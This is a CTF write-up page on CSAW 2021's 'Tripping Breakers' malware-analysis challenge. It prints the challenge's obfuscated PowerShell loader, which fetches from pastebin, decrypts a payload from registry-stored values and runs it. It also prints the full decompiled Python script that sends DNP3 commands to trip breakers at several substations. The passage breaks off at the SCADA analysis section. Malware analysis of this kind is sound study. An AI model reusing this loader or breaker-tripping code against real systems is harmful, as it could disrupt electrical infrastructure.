@@ -1,0 +1,818 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <title>Tripping Breakers (malware analysis, 481) · exti0p's realm</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="HonKit 3.7.1">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../FwordCTF/" />
+    
+    
+    <link rel="prev" href="../" />
+    
+
+    </head>
+    <body>
+        
+<div class="book honkit-cloak">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    2021
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../">
+            
+                <a href="../">
+            
+                    
+                      CSAW CTF Quals
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.1" data-path="tripping_breakers.html">
+            
+                <a href="tripping_breakers.html">
+            
+                    
+                    Tripping Breakers (malware analysis, 481)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../FwordCTF/">
+            
+                <a href="../../FwordCTF/">
+            
+                    
+                      FwordCTF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../../FwordCTF/web/parrotox.html">
+            
+                <a href="../../FwordCTF/web/parrotox.html">
+            
+                    
+                    ParrotOx (web, 997)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../CyberDefenders/">
+            
+                <a href="../../CyberDefenders/">
+            
+                    
+                      CyberDefenders
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../CyberDefenders/DFIR/honeybot.html">
+            
+                <a href="../../CyberDefenders/DFIR/honeybot.html">
+            
+                    
+                    HoneyBOT (DFIR & malware analysis, 1700)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../CyberDefenders/forensic/wiredive.html">
+            
+                <a href="../../CyberDefenders/forensic/wiredive.html">
+            
+                    
+                    WireDive (forensic, 6275)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../../SocVel/">
+            
+                <a href="../../SocVel/">
+            
+                    
+                      SocVel
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../../SocVel/DFIR/losprys.html">
+            
+                <a href="../../SocVel/DFIR/losprys.html">
+            
+                    
+                    Losprys (DFIR, 3000)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../../SocVel/DFIR/dikbek.html">
+            
+                <a href="../../SocVel/DFIR/dikbek.html">
+            
+                    
+                    DikBek (DFIR, 3000)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../../SocVel/DFIR/pooptoria.html">
+            
+                <a href="../../SocVel/DFIR/pooptoria.html">
+            
+                    
+                    Pooptoria (DFIR, 3000)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../../FCSC/">
+            
+                <a href="../../FCSC/">
+            
+                    
+                      FCSC
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../../FCSC/forensic/ordiphone-0.html">
+            
+                <a href="../../FCSC/forensic/ordiphone-0.html">
+            
+                    
+                    Ordiphone0 (forensic, 42)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../../FCSC/forensic/ordiphone-2.html">
+            
+                <a href="../../FCSC/forensic/ordiphone-2.html">
+            
+                    
+                    Ordiphone2 (forensic, 197)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="../../NorzhCTF/">
+            
+                <a href="../../NorzhCTF/">
+            
+                    
+                      NorzhCTF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="../../NorzhCTF/airport_hall/triskel-3.html">
+            
+                <a href="../../NorzhCTF/airport_hall/triskel-3.html">
+            
+                    
+                    Triskel 3 (web, 49)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="../../NorzhCTF/airport_hall/triskel-4.html">
+            
+                <a href="../../NorzhCTF/airport_hall/triskel-4.html">
+            
+                    
+                    Triskel 4 (pentest & misc, 20)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" data-path="../../NorzhCTF/developer_corner/tea_time.html">
+            
+                <a href="../../NorzhCTF/developer_corner/tea_time.html">
+            
+                    
+                    Tea time (pentest, 20)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="../../../2020/">
+            
+                <a href="../../../2020/">
+            
+                    
+                    2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="../../../2020/FwordCTF/">
+            
+                <a href="../../../2020/FwordCTF/">
+            
+                    
+                      FwordCTF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="../../../2020/FwordCTF/web/jailoo-warmup.html">
+            
+                <a href="../../../2020/FwordCTF/web/jailoo-warmup.html">
+            
+                    
+                    Jailoo Warmup (web, 442)
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
+            Published with HonKit
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >Tripping Breakers (malware analysis, 481)</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="tripping-breakers">Tripping Breakers</h1>
+<h2 id="malware-analysis-481-points">Malware analysis, 481 points</h2>
+<h3 id="description">Description</h3>
+<p>Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account. There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages. We would like your help clarifying some information. What was the IP address of the <code>substation_c</code>, and how many total breakers were tripped by this scheduled task? Flag format: <code>flag{IP-Address:# of breakers}</code>. For example if <code>substation_c</code>&apos;s IP address was <code>192.168.1.2</code> and there were 45 total breakers tripped, the flag would be <code>flag{192.168.1.2:45}</code>.</p>
+<p>Author: <a href="https://www.cisa.gov/" target="_blank">Cybersecurity &amp; Infrastructure Security Agency</a></p>
+<h3 id="ranking">Ranking</h3>
+<p><img src="images/csaw_european_ranking.png" alt="CSAW CTF Quals European scoreboard"></p>
+<p>We qualified ourselves by ending up 9th europewide and really enjoyed this huge CTF with tons of various challenges. Furthermore, national teams, that will participate in the European Cybersecurity Challenge (ECSC) in late September 2021, competed with us, such as <strong>m0unt41n</strong> from Switzerland, shout out to them! We will hopefully go head to head with the competition for the Finals scheduled for 12-14 November 2021!</p>
+<h3 id="solution">Solution</h3>
+<ol>
+<li><a href="#suspicious-files-understanding">Suspicious files understanding</a></li>
+<li><a href="#python-script-recovery">Python script recovery</a></li>
+<li><a href="#analysis-of-a-scada-implementation">Analysis of a SCADA implementation</a></li>
+</ol>
+<p>This challenge deals with an <strong>Industrial Control System</strong> which is based on the <a href="https://en.wikipedia.org/wiki/DNP3" target="_blank">DNP3</a> protocol which is mainly used by electrical utilities and water services. We are given folders containing a Windows home directory of the human machine interface operator, known as <code>operator</code> and its registry keys and associated values in a JSON file:</p>
+<pre><code class="lang-bash">$ tree -d
+.
+├── operator
+[...]
+│   ├── AppData
+│   │   └── Local
+│   │       ├── ConnectedDevicesPlatform
+│   │       │   └── L.operator
+│   │       ├── PeerDistRepub
+│   │       ├── PlaceholderTileLogoFolder
+│   │       ├── Publishers
+│   │       │   └── 8wekyb3d8bbwe
+│   │       │       ├── Fonts
+│   │       │       ├── Licenses
+│   │       │       ├── mcg
+│   │       │       ├── Microsoft.WindowsAlarms
+│   │       │       └── SettingsContainer
+│   │       ├── Temp
+│   │       │   ├── EOTW
+│   │       │   ├── Low
+│   │       │   └── mozilla-temp-files
+│   │       └── VirtualStore
+[...]
+└── Registry
+</code></pre>
+<p>As far as we know, the AppData folder often contains files that can be relevant, thus, we focused on it and found two digital forensics artefacts that seemed weird: </p>
+<ul>
+<li>A PowerShell script named <code>wcr_flail.ps1</code>.</li>
+<li>A <code>151.txt</code> file, which is actually an <em>openssl</em> encrypted file.</li>
+</ul>
+<h4 id="suspicious-files-understanding">Suspicious files understanding</h4>
+<p>Once we discovered a PowerShell script, I thought about hidden information in registry hives as I read an article about it this technique recently regarding malware analysis. Here is the script&apos;s content:</p>
+<pre><code class="lang-bash"><span class="hljs-variable">$SCOP</span> = ((new-object System.Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://pastebin.com/raw/rBXHdE85&quot;</span>)).Replace(<span class="hljs-string">&quot;!&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>).Replace(<span class="hljs-string">&quot;@&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>).Replace(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>).Replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>).Replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>).Replace(<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>).Replace(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>).Replace(<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>).Replace(<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>).Replace(<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>).Replace(<span class="hljs-string">&quot;{&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>);
+<span class="hljs-variable">$SLPH</span> = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(<span class="hljs-variable">$SCOP</span>));
+
+<span class="hljs-variable">$E</span>=(Get-ItemProperty -Path <span class="hljs-variable">$SLPH</span> -Name Blast).<span class="hljs-string">&quot;Blast&quot;</span>;
+
+<span class="hljs-variable">$TWR</span> =  <span class="hljs-string">&quot;!M[[pcU09%d^kV&amp;l#9*0XFd]cVG93&lt;&quot;</span>.Replace(<span class="hljs-string">&quot;!&quot;</span>,<span class="hljs-string">&quot;SEt&quot;</span>).Replace(<span class="hljs-string">&quot;@&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>).Replace(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;jcm&quot;</span>).Replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;ZXI=&quot;</span>).Replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;GVF&quot;</span>).Replace(<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;BU&quot;</span>).Replace(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;cTW&quot;</span>).Replace(<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;zb2Z&quot;</span>).Replace(<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>).Replace(<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;iZW1&quot;</span>).Replace(<span class="hljs-string">&quot;{&quot;</span>,<span class="hljs-string">&quot;Fdi&quot;</span>);
+<span class="hljs-variable">$BRN</span> = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(<span class="hljs-variable">$TWR</span>));
+
+<span class="hljs-variable">$D</span>= (Get-ItemProperty -Path <span class="hljs-variable">$BRN</span> -Name Off).<span class="hljs-string">&quot;Off&quot;</span>;
+
+openssl aes-256-cbc -a -A -d -salt -md sha256 -<span class="hljs-keyword">in</span> <span class="hljs-variable">$env</span>:temp<span class="hljs-variable">$D</span> -pass pass:<span class="hljs-variable">$E</span> -out <span class="hljs-string">&quot;c:\1\fate.exe&quot;</span>;
+C:\1\fate.exe;
+</code></pre>
+<pre><code class="lang-bash"><span class="hljs-variable">$SCOP</span> = ((new-object System.Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://pastebin.com/raw/rBXHdE85&quot;</span>)).Replace(<span class="hljs-string">&quot;!&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>).Replace(<span class="hljs-string">&quot;@&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>).Replace(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>).Replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>).Replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>).Replace(<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>).Replace(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>).Replace(<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>).Replace(<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>).Replace(<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>).Replace(<span class="hljs-string">&quot;{&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>);
+SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcVGFibGV0UENcQmVsbA==
+PS &gt; <span class="hljs-variable">$SLPH</span> = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(<span class="hljs-variable">$SCOP</span>));
+PS &gt; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SLPH</span>
+HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell
+</code></pre>
+<p>We broke down the PowerShell script to display the base64 decoded values and by verifying that no <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.1" target="_blank">IEX</a> or alike is there, I try to avoid getting malware on my computer to be honest. For instance, for the first variable <code>$SLPH</code> we echo-ed it this way:</p>
+<pre><code class="lang-bash"><span class="hljs-variable">$SCOP</span> = ((new-object System.Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://pastebin.com/raw/rBXHdE85&quot;</span>)).Replace(<span class="hljs-string">&quot;!&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>).Replace(<span class="hljs-string">&quot;@&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>).Replace(<span class="hljs-string">&quot;#&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>).Replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>).Replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>).Replace(<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>).Replace(<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>).Replace(<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>).Replace(<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>).Replace(<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>).Replace(<span class="hljs-string">&quot;{&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>);
+SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcVGFibGV0UENcQmVsbA==
+PS &gt; <span class="hljs-variable">$SLPH</span> = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(<span class="hljs-variable">$SCOP</span>));
+PS &gt; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SLPH</span>
+HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell
+</code></pre>
+<p>My guess was right, this is a registry hive : <code>HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell</code>. We applied the same process for the second one and we got <code>HKLM:\SOFTWARE\Microsoft\Wbem\Tower</code>.</p>
+<p>From that, we understood that the values from these registries hives are used to encrypt <code>151.txt</code> with openssl, which seems to be our malware. The registry hives associated values are for one the encryption password and for the other the path to the binary. We retrieved them:</p>
+<ul>
+<li><code>M4RK_MY_W0Rd5</code> for the password.</li>
+<li><code>\\EOTW\\151.txt</code> for the relative path to the binary to decrypt.</li>
+</ul>
+<pre><code class="lang-bash">PS &gt; <span class="hljs-variable">$E</span>=<span class="hljs-string">&quot;M4RK_MY_W0Rd5&quot;</span>
+PS &gt; <span class="hljs-variable">$D</span>=<span class="hljs-string">&quot;151.txt&quot;</span>
+PS &gt; openssl aes-256-cbc -a -A -d -salt -md sha256 -<span class="hljs-keyword">in</span> <span class="hljs-variable">$env</span>:temp<span class="hljs-variable">$D</span> -pass pass:<span class="hljs-variable">$E</span> -out <span class="hljs-string">&quot;fate.exe&quot;</span>;
+
+$ file fate.exe 
+fate.exe: PE32+ executable (console) x86-64, <span class="hljs-keyword">for</span> MS Windows
+</code></pre>
+<p>Sounds about right, after decryption, we get <code>fate.exe</code> which is a PE32+, which is a PE 64 bits binary from Windows. A little <code>strings</code> before getting deeper:</p>
+<pre><code class="lang-bash">$ strings fate.exe
+
+[...]
+<span class="hljs-variable">$python36</span>.dll
+</code></pre>
+<p>This is very likely to be an executable compiled with Python 3.6, can we extract the bytecode from it?</p>
+<h4 id="python-script-recovery">Python script recovery</h4>
+<p>This great <a href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank">extractor</a> helped us to <em>unpack</em> the binary and get its pieces:</p>
+<pre><code class="lang-bash">$ python3 pyinstxtractor.py fate.exe 
+
+[+] Processing fate.exe
+[+] Pyinstaller version: 2.1+
+[+] Python version: 36
+[+] Length of package: 5716392 bytes
+[+] Found 59 files <span class="hljs-keyword">in</span> CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: trip_breakers.pyc
+[!] Warning: This script is running <span class="hljs-keyword">in</span> a different Python version than the one used to build the executable.
+[!] Please run this script <span class="hljs-keyword">in</span> Python36 to prevent extraction errors during unmarshalling
+[!] Skipping pyz extraction
+[+] Successfully extracted pyinstaller archive: fate.exe
+
+You can now use a python decompiler on the pyc files within the extracted directory
+</code></pre>
+<p>Interesting stuff here, let&apos;s look at <code>trip_breakers.pyc</code>:</p>
+<pre><code class="lang-bash">$ file trip_breakers.pyc
+trip_breakers.pyc: python 3.9 byte-compiled
+</code></pre>
+<p>Oh. This is awkward. We just saw a Python 3.6 DLL file used in the executable, how can this script be compiled with Python 3.9? We tried to decompile it anyway but it failed. </p>
+<p>After a while we understood that 3.9 is the version that I used to launch <code>pyinstxtractor</code>, we also noticed its warning afterwards. At this point, either I install Python 3.6 and redo this process or I get to know a bit more about these compiled Python scripts. We obviously went down the second road. We asked ourselves: how can one binary (<em>e.g.</em> <code>file</code>) know that it is a 3.9 byte-compiled file: is there any magic number or signature? We stumbled upon this <a href="https://github.com/google/pytype/blob/master/pytype/pyc/magic.py" target="_blank">awesome script</a> from Google&apos;s GitHub, which lists Python version and their associated magic number in the <code>pyc</code> head, which are in the two first bytes of the compiled script. Indeed, in hex digits, we had <code>0D 61</code> which is <code>3425</code> in decimal, which matches the latest 3.9 Python version. We replaced it with <code>20 OD</code> or <code>3360</code> in decimal or the first 3.6 Python version magic number. </p>
+<p>A new decompiler try was a success, end of the <code>pyc</code> steganography. Please have a look at the retrieved script before entering the ending chapter:</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> struct, socket, time, sys
+<span class="hljs-keyword">from</span> crccheck.crc <span class="hljs-keyword">import</span> Crc16Dnp
+OPT_1 = <span class="hljs-number">3</span>
+OPT_2 = <span class="hljs-number">4</span>
+OPT_3 = <span class="hljs-number">66</span>
+OPT_4 = <span class="hljs-number">129</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Substation</span>:</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip_address, devices</span>):</span>
+        self.target = ip_address
+        self.devices = []
+        self.src = <span class="hljs-number">50</span>
+        self.transport_seq = <span class="hljs-number">0</span>
+        self.app_seq = <span class="hljs-number">10</span>
+        <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> devices:
+            self.add_device(device)
+
+        self.connect()
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span>(<span class="hljs-params">self</span>):</span>
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&apos;Connecting to {}...&apos;</span>.<span class="hljs-built_in">format</span>(self.target))
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.connect((self.target, <span class="hljs-number">20000</span>))
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&apos;Connected to {}&apos;</span>.<span class="hljs-built_in">format</span>(self.target))
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_device</span>(<span class="hljs-params">self, device</span>):</span>
+        self.devices.append({<span class="hljs-string">&apos;dst&apos;</span>:device[<span class="hljs-number">0</span>],  <span class="hljs-string">&apos;count&apos;</span>:device[<span class="hljs-number">1</span>]})
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">activate_all_breakers</span>(<span class="hljs-params">self, code</span>):</span>
+        <span class="hljs-keyword">for</span> device <span class="hljs-keyword">in</span> self.devices:
+            dnp3_header = self.get_dnp3_header(device[<span class="hljs-string">&apos;dst&apos;</span>])
+            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, device[<span class="hljs-string">&apos;count&apos;</span>] * <span class="hljs-number">2</span>, <span class="hljs-number">2</span>):
+                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_1, code)
+                self.socket.send(dnp3_packet)
+                time.sleep(<span class="hljs-number">2</span>)
+                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_2, code)
+                self.socket.send(dnp3_packet)
+                time.sleep(<span class="hljs-number">5</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_dnp3_header</span>(<span class="hljs-params">self, dst</span>):</span>
+        data = struct.pack(<span class="hljs-string">&apos;&lt;H2B2H&apos;</span>, <span class="hljs-number">25605</span>, <span class="hljs-number">24</span>, <span class="hljs-number">196</span>, dst, self.src)
+        data += struct.pack(<span class="hljs-string">&apos;&lt;H&apos;</span>, Crc16Dnp.calc(data))
+        <span class="hljs-keyword">return</span> data
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_dnp3_data</span>(<span class="hljs-params">self, index, function, code</span>):</span>
+        data = struct.pack(<span class="hljs-string">&apos;&lt;10BIH&apos;</span>, <span class="hljs-number">192</span> + self.transport_seq, <span class="hljs-number">192</span> + self.app_seq, function, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">23</span>, <span class="hljs-number">1</span>, index, code, <span class="hljs-number">1</span>, <span class="hljs-number">500</span>, <span class="hljs-number">0</span>)
+        data += struct.pack(<span class="hljs-string">&apos;&lt;H&apos;</span>, Crc16Dnp.calc(data))
+        data += struct.pack(<span class="hljs-string">&apos;&lt;HBH&apos;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65535</span>)
+        self.transport_seq += <span class="hljs-number">1</span>
+        self.app_seq += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> self.transport_seq &gt;= <span class="hljs-number">62</span>:
+            self.transport_seq = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">if</span> self.app_seq &gt;= <span class="hljs-number">62</span>:
+            self.app_seq = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">return</span> data
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
+    <span class="hljs-keyword">if</span> socket.gethostname() != <span class="hljs-string">&apos;hmi&apos;</span>:
+        sys.exit(<span class="hljs-number">1</span>)
+    substation_a = Substation(<span class="hljs-string">&apos;10.95.101.80&apos;</span>, [(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">19</span>, <span class="hljs-number">8</span>)])
+    substation_b = Substation(<span class="hljs-string">&apos;10.95.101.81&apos;</span>, [(<span class="hljs-number">9</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">8</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">20</span>, <span class="hljs-number">12</span>), (<span class="hljs-number">15</span>, <span class="hljs-number">19</span>)])
+    substation_c = Substation(<span class="hljs-string">&apos;10.95.101.82&apos;</span>, [(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>), (<span class="hljs-number">9</span>, <span class="hljs-number">16</span>), (<span class="hljs-number">15</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">12</span>, <span class="hljs-number">5</span>)])
+    substation_d = Substation(<span class="hljs-string">&apos;10.95.101.83&apos;</span>, [(<span class="hljs-number">20</span>, <span class="hljs-number">17</span>), (<span class="hljs-number">16</span>, <span class="hljs-number">8</span>), (<span class="hljs-number">8</span>, <span class="hljs-number">14</span>)])
+    substation_e = Substation(<span class="hljs-string">&apos;10.95.101.84&apos;</span>, [(<span class="hljs-number">12</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">13</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">11</span>, <span class="hljs-number">9</span>)])
+    substation_f = Substation(<span class="hljs-string">&apos;10.95.101.85&apos;</span>, [(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">9</span>)])
+    substation_g = Substation(<span class="hljs-string">&apos;10.95.101.86&apos;</span>, [(<span class="hljs-number">10</span>, <span class="hljs-number">14</span>), (<span class="hljs-number">20</span>, <span class="hljs-number">7</span>), (<span class="hljs-number">27</span>, <span class="hljs-number">4</span>)])
+    substation_h = Substation(<span class="hljs-string">&apos;10.95.101.87&apos;</span>, [(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">10</span>, <span class="hljs-number">9</span>), (<span class="hljs-number">13</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">5</span>, <span class="hljs-number">21</span>)])
+    substation_i = Substation(<span class="hljs-string">&apos;10.95.101.88&apos;</span>, [(<span class="hljs-number">14</span>, <span class="hljs-number">13</span>), (<span class="hljs-number">19</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">8</span>, <span class="hljs-number">6</span>), (<span class="hljs-number">17</span>, <span class="hljs-number">8</span>)])
+    substation_a.activate_all_breakers(OPT_3)
+    substation_b.activate_all_breakers(OPT_4)
+    substation_c.activate_all_breakers(OPT_4)
+    substation_d.activate_all_breakers(OPT_4)
+    substation_e.activate_all_breakers(OPT_3)
+    substation_f.activate_all_breakers(OPT_4)
+    substation_g.activate_all_breakers(OPT_3)
+    substation_h.activate_all_breakers(OPT_4)
+    substation_i.activate_all_breakers(OPT_4)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    main()
+</code></pre>
+<h4 id="analysis-of-a-scada-implementation">Analysis of a SCADA implementation</h4>
+<p>From here, we reminded us what we were looking for:</p>
+<ul>
